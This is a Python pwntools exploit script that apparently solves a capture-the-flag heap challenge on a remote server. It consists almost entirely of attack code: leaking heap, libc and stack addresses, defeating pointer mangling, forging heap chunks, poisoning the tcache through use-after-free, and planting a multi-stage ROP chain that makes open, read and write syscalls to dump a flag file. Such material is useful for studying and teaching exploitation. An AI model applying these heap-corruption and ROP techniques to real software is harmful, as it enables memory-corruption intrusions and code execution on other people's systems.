#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '0.cloud.chals.io', 10882

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x1c4a
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def add(content, priority):
    io.sendlineafter(b'vibe:', b'1')
    io.sendlineafter(b':', content)
    io.sendlineafter(b':', str(priority).encode())

def display():
    io.sendlineafter(b'vibe:', b'2')

def delete(id):
    io.sendlineafter(b'vibe:', b'3')
    io.sendlineafter(b':', str(id).encode())

def modify(id, content, priority):
    io.sendlineafter(b'vibe:', b'4')
    io.sendlineafter(b'modify:', str(id).encode())
    io.sendafter(b'description:', content)
    io.sendlineafter(b'(1-5):', str(priority).encode())

def custom_mangle(val, key):
    # return val ^ (key << 7 | key >> 0x39) ^ key
    return val ^ key

def custom_demangle(val, key):
    # return val ^ (key << 7 | key >> 0x39) ^ key
    return val ^ key

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    add(b'A'*79+b'Z', 0x0)
    add(b'B'*79+b'Z', 0x0)

    display()
    io.recvuntil(b'BZ')
    mangled_ptr = u64(io.recv(8))
    io.recvuntil(b'AZ')
    key = u64(io.recv(8)) # MANGLED NULL PTR
    mangled_null_ptr = key
    heap = custom_demangle(mangled_ptr, key) - 0x2a0

    # ===========================================
    # CHUNK OVERLAP -> UNSORTED LEAK LIBC
    # ===========================================

    for i in range(20):
        if len(str(i)) == 1:
            add(f'{i+3}'.encode()*80, 0x0)
        else:
            add(f'{i+3}'.encode()*(80//2), 0x0)
    # modify(20, b'./\x00\n', 1) # heap+0xaf0, only for getdents
    modify(20, b'flag-321527cfeb1aca7161a63a77b958ffbe.txt\x00\n', 1) # heap+0xaf0
    
    fake_chunk = b'\x00'*0x38 + p64(0x491) + b'\x00'*0x10 + p64(mangled_null_ptr) + p8(0x0)
    fake_next = b'\x00'*0x20 + p64(mangled_null_ptr) + p64(0x0) + b'\x00'*0x20 + p64(custom_mangle(heap+0x2e0, key)) + p8(0x2)
    modify(1, fake_chunk, 1)
    modify(2, fake_next, 1)
    delete(0)

    fake_next = b'\x00'*80 + p64(custom_mangle(heap+0x2e0, key)) + p8(0x3)
    modify(3, fake_next, 1) 

    display()
    io.recvuntil(b'ID: 0')
    io.recvuntil(b'Description: ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x21ace0

    # ===========================================
    # UAF LEAK STACK
    # ===========================================
    delete(3)
    delete(4)

    fake_next = b'\x00'*80 + p64(custom_mangle(heap+0x3f0, key)) + p8(0x5)
    modify(5, fake_next, 1)

    next_ptr = p64(mangle(heap, libc.sym['environ']+0x50))[:-2]
    assert(len(next_ptr) == 6)
    modify(4, next_ptr, 1)

    # fake_next = b'\x00'*80 + p64(mangled_null_ptr) + p8(0x6)
    # modify(6, fake_next, 1)

    add(b'\x00'*80, 0x0)
    add(p64(mangled_null_ptr) + p64(77), 0x0)

    fake_next = b'\x00'*80 + p64(custom_mangle(libc.sym['environ'], key)) + p8(0x7)
    modify(7, fake_next, 1)

    display()
    io.recvuntil(b'ID: 77')
    io.recvuntil(b'Description: ')
    stack = u64(io.recv(6).ljust(8, b'\x00'))
    rip = stack - 0x120 - 0x8 # allignment

    # ===========================================
    # UAF ROP STAGE 1
    # ===========================================
    rop = ROP(libc)
    POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
    POP_RDX_R12 = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
    SYSCALL_RET = rop.find_gadget(['syscall', 'ret'])[0]

    payload = flat([
        0x0, # allignment
        POP_RDI,
        0x0,
        POP_RSI,
        rip+0x58,
        POP_RDX_R12,
        0x500, 0x0,
        POP_RAX,
        0x0,
        SYSCALL_RET,
    ])

    delete(8)
    delete(9)

    fake_next = b'\x00'*80 + p64(custom_mangle(heap+0x620, key)) + p8(10)
    modify(10, fake_next, 1)

    next_ptr = p64(mangle(heap, rip))[:-2]
    assert(len(next_ptr) == 6)
    modify(9, next_ptr, 1)

    add(b'\x00'*80, 1)
    add(payload[:0x50], 1)

    # ===========================================
    # UAF ROP STAGE 2
    # ===========================================
    delete(11)
    delete(12)

    fake_next = b'\x00'*80 + p64(custom_mangle(heap+0x770, key)) + p8(13)
    modify(13, fake_next, 1)

    next_ptr = p64(mangle(heap, rip+0x50))[:-2]
    assert(len(next_ptr) == 6)
    modify(12, next_ptr, 1)

    add(b'\x00'*80, 1)
    add(payload[0x50:], 1)

    # ===========================================
    # FINAL ROP STAGE 3
    # ===========================================
    io.sendlineafter(b'vibe:', b'5')
    # pause()

    payload = flat([
        # open
        POP_RDI,
        heap+0xaf0,
        POP_RSI,
        # 65536, # only for getdents
        0x0,
        POP_RDX_R12,
        0x0, 0x0,
        POP_RAX,
        0x2,
        SYSCALL_RET,

        POP_RDI,
        0x3,
        POP_RSI,
        heap+0xaf0,
        POP_RDX_R12,
        0x500, 0x0,
        
        # read
        POP_RAX,
        0x0,

        # getdents
        # POP_RAX,
        # 78,
        SYSCALL_RET,
        
        # write
        POP_RDI,
        0x1,
        POP_RAX,
        0x1,
        SYSCALL_RET,
    ]) + b'\n'
    io.sendline(payload)

    log.info("key %#x", key)
    log.info("heap %#x", heap)
    log.info("libc %#x", libc.address)
    log.info("stack %#x", stack)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
